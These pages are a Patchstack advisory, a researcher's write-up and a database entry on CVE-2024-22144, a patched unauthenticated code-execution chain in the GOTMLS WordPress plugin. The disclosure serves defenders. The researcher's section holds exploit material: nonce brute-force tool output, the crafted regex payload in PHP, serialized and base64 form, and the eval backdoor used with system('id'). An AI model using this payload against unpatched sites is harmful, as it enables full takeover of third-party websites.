=== Content from patchstack.com_c7a39cd0_20250110_182434.html ===


[Skip to main content](#main)
[![](https://patchstack.com/wp-content/uploads/2021/11/logo.svg)](/)

JavaScript is disabled in your browser. Please enable JavaScript for a better experience.

* [Pricing](/pricing/)
* Solutions
  + [WordPress security](https://patchstack.com/wordpress-security/)
  + [Enterprise API](https://patchstack.com/for-hosts/)
  + [Managed VDP](https://patchstack.com/for-plugins/)
  + [Bug Bounty](https://patchstack.com/bug-bounty/)
  + [Plugin auditing](https://patchstack.com/auditing/)
  + [Vulnerability database](https://patchstack.com/database/)
* [Login](https://app.patchstack.com/login)

* ![]()

  + ![]()

    - ![]()

[Start trial](https://app.patchstack.com/register)

# Critical Vulnerability Found in GOTMLS Plugin

[Security advisories](https://patchstack.com/category/security-advisories/)
[Featured](https://patchstack.com/category/featured/)
[Critical Vulnerability](https://patchstack.com/tag/critical-vulnerability/)
[rce](https://patchstack.com/tag/rce/)
Published 12 March 2024Updated 13 March 2024![](https://secure.gravatar.com/avatar/1afc8ea1128a413b5780e102a8032b6f?s=200&d=mm&r=g)[Rafie Muhammad](https://patchstack.com/author/rafie/)Security Researcher at PatchstackTable of Contents

[#### GOTMLS

Unauthenticated Predictable Nonce Brute-Force Leading to RCE](https://patchstack.com/database/vulnerability/gotmls/wordpress-anti-malware-security-and-brute-force-firewall-plugin-4-21-96-unauthenticated-predictable-nonce-brute-force-leading-to-rce-vulnerability)

*The vulnerability in the GOTMLS plugin was originally reported by [stealthcopter](https://patchstack.com/database/researcher/01d0264f-f59a-4daa-a919-a6b2735e01db) to the [Patchstack bug bounty program for WordPress](https://patchstack.com/bug-bounty/). We are collaborating with the researcher to release the content of this security advisory article.*

This blog post is about the GOTMLS plugin vulnerability. If you’re a GOTMLS user, please update the plugin to at least version **4.23.56**.

**All paid Patchstack users are protected from this vulnerability.** Sign up for the [free Community account](https://app.patchstack.com/register) first, to scan for vulnerabilities and apply protection for only **$5 / site per month** with Patchstack.

For plugin developers, we have [security audit services](https://patchstack.com/auditing/) and [Enterprise API](https://patchstack.com/for-hosts/) for hosting companies.

## About the GOTMLS Plugin

The plugin [GOTMLS](https://wordpress.org/plugins/gotmls/) (free version), which has over **200,000** active installations, is known as the more popular “Anti-Malware Security and Brute-Force Firewall” plugin in WordPress.

![](https://patchstack.com/wp-content/uploads/2024/01/image-2.png)

This WordPress plugin has some features, one of which is to run a Complete Scan to automatically remove known security threats, backdoor scripts, and database injections. Another feature available is firewall and brute-force protection.

## The security vulnerability

This plugin suffers from multiple vulnerabilities and could allow any unauthenticated user to gain a remote code execution on the WordPress site.

The vulnerability chain begins with unprotected API functions that leak sensitive data, including server time. This allows brute forcing of an insufficiently random value used for a nonce. This nonce is used to authenticate to additional API functions that allow updating of malware definitions. These regexes can be abused to selectively delete source code resulting in code execution. The described vulnerability was fixed in version **4.23.56** and assigned **CVE-2024-22144**.

### Unauthenticated API Access

Allowing unauthenticated access to critical API functions in a plugin creates a significant security risk, as it permits any user, to access and potentially manipulate sensitive functionalities, laying the groundwork for potential exploitation and unauthorized actions. Plugins should restrict publicly accessible APIs to only those that are strictly necessary.

Interestingly, the plugin exposes several functions to unauthenticated users via the `admin-ajax.php` file, by adding an actions prefix with `wp_ajax_nopriv_`. This allows anyone to access the `GOTMLS_` functions provided which start with the letter `l`, giving us direct access to 4 sensitive functions such as `load_update`, `log_session`, `logintime` and `lognewkey`.

```
--------------------- CUTTED HERE ---------------------
$ajax_functions = array('load_update', 'log_session', 'empty_trash', 'fix', 'logintime', 'lognewkey', 'position', 'scan', 'View_Quarantine', 'whitelist');
// ...
foreach ($ajax_functions as $ajax_function) {
   add_action("wp_ajax_GOTMLS_$ajax_function", "GOTMLS_ajax_nopriv");
   add_action("wp_ajax_nopriv_GOTMLS_$ajax_function", substr($ajax_function, 0, 1) == "l"?"GOTMLS_ajax_$ajax_function":"GOTMLS_ajax_nopriv");
}
--------------------- CUTTED HERE ---------------------

```

The `logintime` function exposes the server’s micro time value, information which can be used for the next part of the vulnerability to calculate and brute force a valid nonce due to insufficient randomness.

### Insufficient Randomness in Nonce Generation

It is a dangerously common anti-pattern to create what appears to be a random hash using predictable or known inputs (remember predictable input gives predictable output). This can leave systems vulnerable to bad actors who could directly guess or brute force these values.

The code snippet below illustrates how the plugin was generating nonces:

```
--------------------- CUTTED HERE ---------------------
$nonce = md5(substr(number_format(microtime(true), 9, '-', '/'), 6).GOTMLS_installation_key.GOTMLS_plugin_path);
--------------------- CUTTED HERE ---------------------
```

In this instance, `GOTMLS_plugin_path` was predictable and `GOTMLS_installation_key` was known as it is generated from the site URL. The server also leaked its current micro time to 4 decimal places. This means that a brute force approach would only need to try a few million hashes before it could successfully guess a valid nonce.

A key aspect of nonce security is ensuring that they are tied to specific sessions. This practice adds an additional layer of security, as it associates each nonce with a unique user session, making it significantly more difficult for attackers to exploit. In this plugin, nonces are stored globally and reused between different users.

Another interesting quirk in the code allowed for the validation of an array of nonces. This significantly reduced the number of requests required to brute force a value. The limitation here is PHP’s `max_input_vars` which typically restricts the number of variables in HTTP requests to 1000.

### Code Execution by Injecting Malicious Malware Rules

Once a valid nonce is obtained, the plugin gives you more access including all the Ajax functions, not just those beginning with the letter `l`. These are more sensitive administrative API functions that can be accessed and manipulated.

One such function allows for the update of PHP serialized, base64 encoded malware definitions. By injecting custom regexes into these definitions, it is possible to manipulate the plugin to scan its own source code and delete specific strings, leaving behind an exploitable code fragment `eval($_REQUEST['mt']);`. This process leads to fully unauthenticated RCE. The way this selective code deletion functions is demonstrated in the gif below:

![](https://patchstack.com/wp-content/uploads/2024/01/poc_gotlms-1.gif)
## The patch

The patch includes fixes that disrupt the exploit chain at multiple points, preventing unauthenticated remote code execution. The full patch [code changes](https://plugins.trac.wordpress.org/changeset?old_path=%2Fgotmls%2Ftags%2F4.21.96&old=&new_path=%2Fgotmls%2Ftags%2F4.23.56&new=&sfp_email=&sfph_mail=) can be seen here. Some of the points from the patch attempt:

**\*\*Nonce Validation\*\* –** The `GOTMLS_get_nonce` function now only accepts a single nonce, not an array, allowing validation of one nonce at a time. It is also no longer possible to use this function to invalidate existing nonces.

**\*\*Nonce Creation\*\* –** Added user and context identifiers (`$uid` and `$context`) to the `GOTMLS_get_nonce` function. It is also no longer possible to create new nonces without authentication.

**\*\*Information Leakage\*\* –** The unauthenticated endpoints `GOTMLS_log_session and GOTMLS_logintime` no longer leak the server’s current micro time.

**\*\*Malware Definitions Update\*\* –** The `GOTMLS_ajax_load_update` endpoint, which updates malware definitions, now includes a user check to ensure only admins can perform updates, using the custom function `GOTMLS_user_can`. These updates significantly increase the difficulty of brute-forcing a valid nonce, making it currently impractical without exploiting additional vulnerabilities.

## Conclusion

The vulnerabilities discussed here underscore the importance of securing all aspects of a plugin, especially those designed for security purposes. For developers, it is crucial to ensure that every function and API endpoint is secured with appropriate authentication and validation mechanisms to prevent exploitation. It is highly recommended to avoid creating your own security functions and to utilize those already built into WordPress, such as nonce creation and validation. These have been tested and approved by a larger community, making them more reliable than creating your own from scratch.

## Timeline

04 January, 2024We received the report from our alliance member ([stealthcopter](https://patchstack.com/database/researcher/01d0264f-f59a-4daa-a919-a6b2735e01db)) and reached out to the plugin vendor.

17 February, 2024GOTMLS version **4.23.56** released to patch the reported issues.

12 March , 2024Added the vulnerabilities to the [Patchstack vulnerability database](https://patchstack.com/database/vulnerability/gotmls/wordpress-anti-malware-security-and-brute-force-firewall-plugin-4-21-96-unauthenticated-predictable-nonce-brute-force-leading-to-rce-vulnerability). Security advisory article publicly released.

## Help us make the Internet a safer place

Making the WordPress ecosystem more secure is a team effort, and we believe that plugin developers and security researchers should work together.

* If you’re a **plugin developer**, join our [mVDP program](http://patchstack.com/for-plugins/) that makes it easier to report, manage and address vulnerabilities in your software.
* If you’re a **security researcher**, join [Patchstack Alliance](https://patchstack.com/bug-bounty/) to report vulnerabilities & earn rewards.
Found this useful? Share on

* ![](https://patchstack.com/wp-content/uploads/2024/06/twitter-x-line.svg)
* ![](https://patchstack.com/wp-content/uploads/2024/03/facebook-fill.svg)
* ![](https://patchstack.com/wp-content/uploads/2024/03/linkedin-fill.svg)

Protect your websites against WordPress vulnerabilities[Get started](/pricing/)
### Monthly security advice

Get the latest WordPress security intelligence delivered to your inbox.**NEW**: Get started with 5 bite-sized security lessons.
Email SignupEmailSubscribe
### The latest in Security advisories

[See all](https://patchstack.com/category/security-advisories/)[![](https://patchstack.com/wp-content/uploads/2025/01/Critical-Vulnerability-Patched-in-GiveWP-Plugin-main.png)10 January, 2025
#### Critical Vulnerability Patched in GiveWP Plugin

Critical Vulnerability
php object injection
Zeroday bounties
zeroday
givewp](https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/)[![](https://patchstack.com/wp-content/uploads/2025/01/Critical-Vulnerabilities-Found-in-Fancy-Product-Designer-Plugin-main.png)8 January, 2025
#### Critical Vulnerabilities Found in Fancy Product Designer Plugin

Critical Vulnerability
arbitrary file upload
SQL Injection
ENVATO](https://patchstack.com/articles/critical-vulnerabilities-found-in-fancy-product-designer-plugin/)[![](https://patchstack.com/wp-content/uploads/2024/12/Multiple-Critical-Vulnerabilities-Patched-in-WPLMS-and-VibeBP-Plugins-main.png)23 December, 2024
#### Multiple Critical Vulnerabilities Patched in WPLMS and VibeBP Plugins

theme
SQL Injection
ENVATO
Critical Vulnerability
privilege escalation
arbitrary file upload](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wplms-and-vibebp-plugins/)

### Website security

[Pricing](https://patchstack.com/pricing/)[For WordPress](https://patchstack.com/wordpress-security/)[For WooCommerce](https://patchstack.com/woocommerce-security)[For agencies](https://patchstack.com/for-agencies/)[API for hosts](https://patchstack.com/for-hosts/)[Documentation](https://docs.patchstack.com/)[Log in](https://app.patchstack.com/login)
### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)[Log in](https://vdp.patchstack.com/vdp/login)[Active programs](https://patchstack.com/database/vdp/)[Security auditing](https://patchstack.com/auditing/)
### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)[Log in](https://vdp.patchstack.com/researchers/login)[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)[Learn](https://patchstack.com/academy)[Discord](https://discord.gg/rkE8yxtNmS)
### Resources

[Vulnerability database](https://patchstack.com/database/)[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024/)[Vulnerability statistics](https://patchstack.com/database/statistics/wordpress)[Case studies](https://patchstack.com/category/case-studies/)[Articles](https://patchstack.com/articles/)
### Patchstack

[About](https://patchstack.com/about/)[Careers](https://patchstack.com/about/#careers)[Merch store](https://store.patchstack.com)[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)
### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)[Facebook](https://www.facebook.com/patchstackapp)[X](https://twitter.com/patchstackapp)[![Patchstack logo](https://patchstack.com/wp-content/uploads/2024/01/logo-opt-300x32.webp)](/)© 2025 Patchstack[DPA](https://patchstack.com/data-processing-agreement-dpa/)[Privacy Policy](https://patchstack.com/privacy-policy/)[Terms & Conditions](https://patchstack.com/terms-and-conditions/)![Co-funded by EU logo](https://patchstack.com/wp-content/uploads/2024/01/EIC-logo-CoFundedBy-opt.webp)
[![](https://patchstack.com/wp-content/uploads/2021/01/logo.png)](/)
### Website security

[Pricing](https://patchstack.com/pricing/)[For WordPress](https://patchstack.com/wordpress-security/)[For WooCommerce](https://patchstack.com/woocommerce-security)[For agencies](https://patchstack.com/for-agencies/)[API for hosts](https://patchstack.com/for-hosts/)[Documentation](https://docs.patchstack.com/)[Log in](https://app.patchstack.com/login)
### For plugin devs

[Managed VDP](https://patchstack.com/for-plugins/)[Log in](https://vdp.patchstack.com/vdp/login)[Active programs](https://patchstack.com/database/vdp/)[Security auditing](https://patchstack.com/auditing/)
### For researchers

[Bug bounty](https://patchstack.com/bug-bounty/)[Log in](https://vdp.patchstack.com/researchers/login)[Guidelines](https://patchstack.com/articles/bug-bounty-guidelines-rules/)[Learn](https://patchstack.com/academy)[Discord](https://discord.gg/rkE8yxtNmS)
### Resources

[Vulnerability database](https://patchstack.com/database/)[Whitepaper 2024](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024/)[Vulnerability statistics](https://patchstack.com/database/statistics/wordpress)[Case studies](https://patchstack.com/category/case-studies/)[Articles](https://patchstack.com/articles/)
### Patchstack

[About](https://patchstack.com/about/)[Careers](https://patchstack.com/about/#careers)[Merch store](https://store.patchstack.com)[Media kit](https://drive.google.com/drive/u/2/folders/1VlVbJnh8nBTVtJGvuo8KjAOgstBWxQ_W)
### Socials

[LinkedIn](https://www.linkedin.com/company/patchtsack/)[Facebook](https://www.facebook.com/patchstackapp)[X](https://twitter.com/patchstackapp)© 2025 Patchstack[DPA](https://patchstack.com/data-processing-agreement-dpa/)[Privacy Policy](https://patchstack.com/privacy-policy/)[Terms & Conditions](https://patchstack.com/terms-and-conditions/)

Looks like your browser is blocking our support chat widget. Turn off adblockers and reload the page.Reload page

xml version="1.0"?closechevron-downchainbarsangle-rightangle-upxml version="1.0"?crossmenu



=== Content from sec.stealthcopter.com_bdbd863f_20250110_182436.html ===
[Stealthcopter](/)

* [Hacking](/tags/hacking/)
* [Software](/tags/software/)
* [CTF](/tags/ctf/)
* [WordPress](/tags/wordpress/)

[Hacking](/tags/hacking)
# Unauthenticated RCE in Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin CVE-2024-22144

Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities in the Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin

* [![stealthcopter](/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png)](/authors/stealthcopter)

#### [stealthcopter](/authors/stealthcopter)

12 March 2024
• 9 min
read![](/content/images/2024/01/gotmls-uhoh.jpg)
### tldr;

The Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin is vulnerable to Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities including unprotected API access, insufficient randomness, insecure design and improper sanitization of data. Final remote code execution was achieved by injection of malicious regex rules causing selective deletion of source code leaving behind a command shell.

**Affected Versions:** <=4.21.96
**CVSS Score:** 9.0
**Links:** [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22144&ref=sec.stealthcopter.com), [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-22144?ref=sec.stealthcopter.com)
**Active installations**: 200,000+

## About the GOTMLS Plugin

The [Anti-Malware Security and Brute-Force Firewall (GOTMLS)](https://en-gb.wordpress.org/plugins/gotmls/?ref=sec.stealthcopter.com) is a freemium WordPress plugin that is designed for malware detection and automatic removal. Is an essential tool for many WordPress sites, with over 200,000 active installations.

![GOTMLS logo](https://ps.w.org/gotmls/assets/banner-772x250.jpg?rev=1043954)

GOTMLS logo

## Vulnerabilities

The vulnerability chain begins with unprotected API functions that leak sensitive data, including server time. This allows brute forcing of an insufficiently random value used for a nonce. This nonce is then used to authenticate to additional API functions that allow updating of malware definitions. These malware regex’s can be abused to selectively delete source code resulting in remote code execution. The identified vulnerability has been assigned a CVSS score of 9.0, highlighting its severity.

### Unauthenticated API Access

Allowing unauthenticated access to critical API functions in a plugin creates a significant security risk, as it permits any user, to access and potentially manipulate sensitive functionalities, laying the groundwork for potential exploitation and unauthorized actions. Plugins should restrict publicly accessible APIs to only those that are strictly necessary.

Interestingly, the plugin exposes several functions to unauthenticated users via the `admin-ajax.php` file, by adding actions prefix with `wp_ajax_nopriv_`. This allows anyone to access `GOTMLS_` functions provided they start with the letter `l`, giving us direct accesss to 4 sensitive functions (`load_update`, `log_session`, `logintime` and `lognewkey`).

```
$ajax_functions = array('load_update', 'log_session', 'empty_trash', 'fix', 'logintime', 'lognewkey', 'position', 'scan', 'View_Quarantine', 'whitelist'); // ... foreach ($ajax_functions as $ajax_function) { add_action("wp_ajax_GOTMLS_$ajax_function", "GOTMLS_ajax_nopriv"); add_action("wp_ajax_nopriv_GOTMLS_$ajax_function", substr($ajax_function, 0, 1) == "l"?"GOTMLS_ajax_$ajax_function":"GOTMLS_ajax_nopriv"); }

```

The `logintime` function exposes the server’s microtime, information which can be used for the next part of the vulnerability to calculate and brute force a valid nonce due to insufficient randomness.

### Insecure Nonce Generation and Validation

It is a dangerously common anti-pattern to create what appears to be a random hash using predictable or known inputs (remember predictable input gives predictable output). This can leave systems vulnerable to bad actors who could directly guess or brute force these values.

The code snippet below illustrates how the plugin was insecurely generating nonces:

```
md5(substr(number_format(microtime(true), 9, '-', '/'), 6).GOTMLS_installation_key.GOTMLS_plugin_path);

```

In this instance, `GOTMLS_plugin_path` was predictable, `GOTMLS_installation_key` was known as it is generated from the site URL. The server also leaks its current microtime to 4 decimal places. As number formatter is forcing it to output to 9 decimal places the last 5 digits will be “random”. This means that even known exact time a brute force approach would still need to try a few million hashes before it could successfully guess a valid once. We can use some profiling and maths to try and predict the creation time more accurately by checking the server’s microtime directly before and directly after the nonce generation.

A key aspect of nonce security is ensuring that they are tied to specific sessions. This practice adds an additional layer of security, as it associates each nonce with a unique user session, making it significantly more difficult for attackers to exploit. In this plugin nonces are stored globally and reused between different users.

Another interesting quirk in occurs when the nonce is validated; The function accepts either a single value for a nonce or an array of values as shown in the code snippet below:

```
if (is_array($_REQUEST["GOTMLS_mt"])) { foreach ($_REQUEST["GOTMLS_mt"] as $_REQUEST_GOTMLS_mt) if (strlen($_REQUEST_GOTMLS_mt) == 32 && isset($GLOBALS["GOTMLS"]["tmp"]["nonce"][$_REQUEST_GOTMLS_mt])) return (INT) $GLOBALS["GOTMLS"]["tmp"]["nonce"][$_REQUEST_GOTMLS_mt]; return 0; } elseif (strlen($_REQUEST["GOTMLS_mt"]) == 32 && isset($GLOBALS["GOTMLS"]["tmp"]["nonce"][$_REQUEST["GOTMLS_mt"]])) { return (INT) $GLOBALS["GOTMLS"]["tmp"]["nonce"][$_REQUEST["GOTMLS_mt"]]; }

```

This significantly reduces the number of requests required to brute force a valid nonce, as we could send multiple guesses at once. How many values could be validated in a single request is limited only by PHP’s `max_input_vars`. On standard setups this typically restricts the number of variables in a HTTP request to 1000.

Another flaw in this plugin’s functionality was that an attacker could invalidate all existing nonces stored on the server and insert up to 25 new ones by modifying a time parameter with each request. This allows an attacker to quickly create many nonces over a short period of time which massively increases the changes of guessing a correct one.

Combining all of these flaws was quite technical but resulted in an attack that could be completed reliably within 30 seconds to a few minutes. This was first tested against an instance running on localhost and confirmed by patchstack by running a vulnerable instance of the plugin on one AWS server and attacking it with another.

```
python gotmls.py http://44.201.189.48
[+] Exploiting Host: http://44.201.189.48
[+] Calculated Installation Key: 124b65e39d7b19df6a45cdaa16dc6044
[+] Using Plugin Path: /var/www/html/wp-content/plugins/gotmls/
[+] Calibrating timing attack:
 ├ Offset time:     0.00778 ms (min:0.00691 max:0.00963)
 └ Round trip time: 0.02902 ms (min:0.02769 max:0.03194)
[+] Starting attack:
 ├ Server Microtime: 1704461766.5626
 ├ Clearing Existing Nonces
 ├ Start time: 1704461766.6197805
 ├ Midpoint:   1704461767.0998244
 ├ End time:   1704461767.5798683
 └ 25 Nonces Injected in 0.96009 s (avg 0.038404)
[?] Attack feasibility calculation
 ├ These values are the maximum search space, average attack should take 50% of these
 ├ Hashes: 42,243,862
 ├ Requests: 42,456
 └ Estimated Time: 1,630s
[*] Press enter to continue or ctrl+c to stop
[-] Tested 1,058,680 hashes over 1,064 requests (speed 36,566 h/s)
[+] Found hash!!! (Tested: 1,058,680 hashes)
 └ Brute forced a valid nonce in 32.60srequests (speed 36,657 h/s)
 └ Converted 995 hashes into single nonce e0c5ed6becf3f50ba6abe787f15f2752
[+] Validated nonce and server key

```

Another interesting thing to note is that the PHP execution and response (~90ms) is significantly slower than the HTTP request’s time (2-10ms) in flight. This means that for the attack demonstrated here the connection speed is not the main factor contributing to the search space. This means that this vulnerability is incredibly dangerous as it has an approximately constant attack space making it feasible even against remote targets. It is even worse against more powerful servers and those using multi-threading, as they would allow for more nonces to be created in less time.

### Remote Code Execution by Injecting Malicious Malware Rules

Once a valid nonce is obtained, the plugin gives you access to all the ajax functions, not just those beginning with `l`. These are more sensitive administrative API functions that can be accessed and manipulated.

One such function, `GOTMLS_ajax_load_update`, allows for the update of PHP serialized, base64 encoded malware definitions. This part of the function should have been designed to be private and only accessible when called internally, not by an end user.

The malware definitions are protected against direct insecure deserialization attacks thanks to a small regex protection. However, we can now insert custom regex’s into these definitions, and continue our attack using intended functionality of the plugin. It is possible to specially craft some regex’s so that the plugin will scan its own source code and selectively delete parts, leaving behind an exploitable code fragment. There are likely countless ways to do this, I selected one that left behind an evil `eval` statement. Below you can see the PHP code I wrote with the 3 regex’s to achieve when running on the `images/index.php` file.

```
$inj = array("known" => array( "stealthcopter testing 1"=>array(0 => 'M4t01', 1 => '/\$bad = array\("/'), "stealthcopter testing 2"=>array(0 => 'M4t02', 1 => '/", "preg_replace.*?isset/s'), "stealthcopter testing 3"=>array(0 => 'M4t03', 1 => '/&&is_numeric\(.*?\n\)(?=;)/s') )); $serial = @serialize($inj); echo $serial."\n"; echo urlsafe_b64encode($serial)."\n";

```

This gives us a serialized PHP object of:

```
a:1:{s:5:"known";a:3:{s:23:"stealthcopter testing 1";a:2:{i:0;s:5:"M4t01";i:1;s:18:"/\$bad = array\("/";}s:23:"stealthcopter testing 2";a:2:{i:0;s:5:"M4t02";i:1;s:27:"/", "preg_replace.*?isset/s";}s:23:"stealthcopter testing 3";a:2:{i:0;s:5:"M4t03";i:1;s:29:"/&amp;&amp;is_numeric\(.*?\n\)(?=;)/s";}}}

```

Which in base64 is:

```
YToxOntzOjU6Imtub3duIjthOjM6e3M6MjM6InN0ZWFsdGhjb3B0ZXIgdGVzdGluZyAxIjthOjI6e2k6MDtzOjU6Ik00dDAxIjtpOjE7czoxODoiL1wkYmFkID0gYXJyYXlcKCIvIjt9czoyMzoic3RlYWx0aGNvcHRlciB0ZXN0aW5nIDIiO2E6Mjp7aTowO3M6NToiTTR0MDIiO2k6MTtzOjI3OiIvIiwgInByZWdfcmVwbGFjZS4qP2lzc2V0L3MiO31zOjIzOiJzdGVhbHRoY29wdGVyIHRlc3RpbmcgMyI7YToyOntpOjA7czo1OiJNNHQwMyI7aToxO3M6Mjk6Ii8mJmlzX251bWVyaWNcKC4qP1xuXCkoPz07KS9zIjt9fX0

```

This was then passed to the `load_update` ajax function and the malware definitions were successfully updated. Following this we now just need to call another endpoint to execute a scan on a single file `images/index.php` and it will be executed.

![A visual demonstration of how the 3 regexs work to selectively delete code and leave behind an exploitable code fragment.](/content/images/2024/01/gotmls-malware-replace-1.gif)

A visual demonstration of how the 3 regexs work to selectively delete code and leave behind an exploitable code fragment.

The gif above shows the original source code, and the 3 parts that are removed using the injected malware regex definitions. Following the selective deletions the following code is left behind:

```
eval($_REQUEST["mt"]);

```

This leaves behind a basic backdoor, `eval`, will execute any string passed into it as PHP code. We can trigger this by sending a simple bit of PHP code in the `mt` parameter to execute arbitrary PHP commands such as:

```
die(system("id"));

```

This leaves us with a full unauthenticated remote code execution attack as can be shown in the screenshot below:

```
[+] Found hash!!! (Tested: 1,058,680 hashes)
 └ Brute forced a valid nonce in 32.60srequests (speed 36,657 h/s)
 └ Converted 995 hashes into single nonce e0c5ed6becf3f50ba6abe787f15f2752
[+] Validated nonce and server key
[!] Injecting a shell into images/index.php is a destructive process
[*] Press any key to continue or ctrl+c to quit
[+] Injecting malicious update
[+] Executing shell with: id
 └ uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

```

Now that this backdoor shell has been created we can access it using curl or in the browser:

![Screenshot showing the result from the newly uploaded shell post exploitation](/content/images/2024/01/gotmls-execution-browser.png)

Screenshot showing the result from the newly uploaded shell post exploitation

## Timeline

Thanks to [Eli Scheetz](https://twitter.com/elischeetz?lang=en&ref=sec.stealthcopter.com) the author of GotMLS for fixing this vulnerability and for generously donating a few coffees to fuel my research ☕. Also a shoutout to [Dave](https://patchstack.com/database/researcher/df1fbf88-bded-4058-8b28-efccedf93a49?ref=sec.stealthcopter.com) from Patchstack for his patience getting the exploit working.

* **28/01/24 (a few days before)** - I knew there was something interesting here but discovery and development of this exploit took quite a few days as it was a tricky beast.
* **04/01/24 ( 0 day)** - Disclosure to Patchstack
* **05/01/24 (+1 day)** - [Patchstack](https://patchstack.com/?ref=sec.stealthcopter.com) tested and validated the vulnerability chain. They awarded 180 AXP with an additional 1.5x for writing an advisory. Resulting in a total of 270 AXP.
* **20/02/24 (+16 days)** - Patch published
* **12/03/24 (+37 days)** - Vulnerability Published

## Conclusion

The vulnerabilities discussed here underscore the importance of securing all aspects of a plugin, especially those designed for security purposes. For developers, it is crucial to ensure that every function and API endpoint is secured with appropriate authentication and validation mechanisms to prevent exploitation. It is highly recommended to avoid creating your own security functions and to utilize those already built into WordPress, such as nonce creation and validation. These have been tested and approved by a larger community, making them more reliable than creating your own from scratch.

Share This:

[![Intigriti February CTF Challenge: Love Letter Storage](/content/images/2024/02/favourite-triager--1-.png)](/intigriti-february-ctf-challenge-love-letter-storage/)[CTF
## Intigriti February CTF Challenge: Love Letter Storage

tl;dr: Solved an awesome Valentine’s Day challenge by @goatsniff from Intigriti. I gained valuable insights into using character conversions to bypass XSS protections and learned about data exfiltration through the manipulation of cookie paths.](/intigriti-february-ctf-challenge-love-letter-storage/)

* [![stealthcopter](/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png)](/authors/stealthcopter)

[stealthcopter](/authors/stealthcopter)22 February 2024
• 14 min read[![NahamCon CTF 2024: My Shop Disaster](/content/images/2024/05/_3d5a8f27-e437-4a12-8c45-fab8712a42a8.jpeg)](/nahamcon-ctf-2024-my-shop-disaster/)[CTF
## NahamCon CTF 2024: My Shop Disaster

Solution for the WooCommerce WordPress plugin challenge that PatchStack submitted to the NahamCon 2024 CTF.](/nahamcon-ctf-2024-my-shop-disaster/)

* [![stealthcopter](/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png)](/authors/stealthcopter)

[stealthcopter](/authors/stealthcopter)27 May 2024
• 7 min read[stealthcopter](/) © 2024

[Latest Posts](/)[About](/about)![](https://analytics.stealthcopter.com/ingress/a7d59cbc-f84e-45b7-974f-aec87e055248/pixel.gif)

=== Content from patchstack.com_da342b30_20250110_182435.html ===


[Pricing](https://patchstack.com/pricing/)
Solutions

[WordPress security

Instantly fix and mitigate vulnerabilities](https://patchstack.com/wordpress-security/)
[Plugin auditing

Paid auditing for WordPress vendors](https://patchstack.com/auditing/)
[Managed VDP

Start a security program for your plugin](https://patchstack.com/for-plugins/)
[Bug Bounty

Join the community and earn bounties](https://patchstack.com/bug-bounty/)
[Enterprise API

At scale monitoring and vPatching for hosts](https://patchstack.com/for-hosts/)
[Vulnerability database

The latest WordPress security intelligence](https://patchstack.com/database/)

[Login](https://app.patchstack.com/login)

[Start trial](https://app.patchstack.com/register?type=pro)

# WordPress Anti-Malware Security and Brute-Force Firewall Plugin <= 4.21.96 is vulnerable to Remote Code Execution (RCE)

![Patch priority: high](https://patchstack.com/database/img/priority-high.svg)

High priority

vPatch immediately

![Vulnerable version](https://patchstack.com/database/img/vulnerable_version.svg)

<= 4.21.96

Vulnerable version

![Fixed](https://patchstack.com/database/img/fix-available.svg)

4.23.56

Fixed version

[![](https://patchstack.com/database/img/platforms/WordPress.svg)](https://patchstack.com/database/wordpress/plugin/gotmls)

[![No VDP](https://patchstack.com/database/img/shield-grey.svg)
No VDP](https://patchstack.com/for-plugins/)

12 March 2024
by Patchstack

# Risks

CVSS 9

This vulnerability is highly dangerous and expected to become mass exploited.

##### 9

### Remote Code Execution (RCE)

This could allow a malicious actor to execute commands on the target website. This can be used to gain backdoor access to then take full control of the website.

This is a general description of this vulnerability type, specific impact varies case by case.
CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way, but it is not ideal for CMSs.

# Solutions

We advise to mitigate or resolve the vulnerability immediately.

![Protect your website(s)](https://patchstack.com/database/img/shield-star.svg)
### Automatically mitigate vulnerabilities and keep your websites safe

Patchstack has issued a virtual patch to mitigate this issue by blocking any attacks until
you have updated to a fixed version.

#### Get the fastest vulnerability mitigation with Patchstack!

[Get Started](https://patchstack.com/pricing/)

![Update to version X or later](https://patchstack.com/database/img/update-checkmark.svg)
### Update to version 4.23.56 or later.

Update to version 4.23.56 or later to remove the vulnerability.
Patchstack users can turn on auto-update for vulnerable plugins only.

# Details

Software

Anti-Malware Security and Brute-Force Firewall

Type

Plugin

Vulnerable versions

<= 4.21.96

Fixed in

4.23.56

OWASP Top 10

A3: Injection

Classification

Remote Code Execution (RCE)

CVE

[CVE-2024-22144](https://www.cve.org/CVERecord?id=CVE-2024-22144)

Patch priority

High

CVSS severity

High
(9)

Developer

[Claim ownership](https://patchstack.com/for-plugins)

PSID

7fc7064849ae

Credits

[![stealthcopter](https://patchstack.com/database/img/logomark-small.svg)](https://patchstack.com/database/researcher/01d0264f-f59a-4daa-a919-a6b2735e01db)

Required privilege

Unauthenticated

Published

12 March, 2024

![Remove and replace software](https://patchstack.com/database/img/expand.svg)
Have additional information or questions about this entry?
Let us know.

#### Found this useful? Support stealthcopter for reporting this vulnerability.

[Send thanks](https://www.buymeacoffee.com/stealthcopter)

#### Found this report useful?

[Send thanks](https://www.buymeacoffee.com/stealthcopter)

# Timeline

![Search icon](https://patchstack.com/database/img/search-green.svg)

Reported by

